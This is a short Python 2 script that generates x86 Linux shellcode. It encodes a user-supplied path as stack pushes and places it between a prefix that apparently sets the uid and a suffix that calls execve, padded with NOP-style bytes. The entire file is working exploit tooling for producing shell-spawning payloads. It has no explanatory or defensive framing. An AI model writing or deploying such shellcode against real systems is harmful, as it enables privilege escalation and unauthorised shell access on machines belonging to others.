import sys, getopt

def reverseString(input):
    output = "";
    for i in xrange(len(input)-1,-1,-1):
        output+=input[i]
    return output



def generatePayload(str_input):
    input = str_input
    remainder = len(input) % 4

    #Make sure input is even with 4 bytes
    if remainder != 0:
        padding = "/"*(4 - remainder)
        input = padding + input

    #Reverse string
    output = reverseString(input)

    hexString = ""; 
    index = 0
    codeList = []

    payload_mid = "";

    for c in output:
        codeList.append(str(hex(ord(c))).replace("0x",""))
        index += 1
        if index % 4 == 0:
            reversedBytes = []
            for i in xrange(len(codeList)-1,-1,-1):
                reversedBytes += codeList[i];
            payload_mid += "68"
            for i in xrange(0,len(reversedBytes)-1,2):
                payload_mid += ""+reversedBytes[i] + reversedBytes[i+1]
            del codeList[:]

    payload_pre=  "\x6a\x46\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52" #Set up uid
    payload_mid = payload_mid.decode("hex")
    payload_post= "\x89\xe3\x52\x53\x89\xe1\xcd\x80\x66\x90\x66\x90\x66\x90\x66\x90\x66\x90" #Call execve
    return payload_pre + payload_mid + payload_post

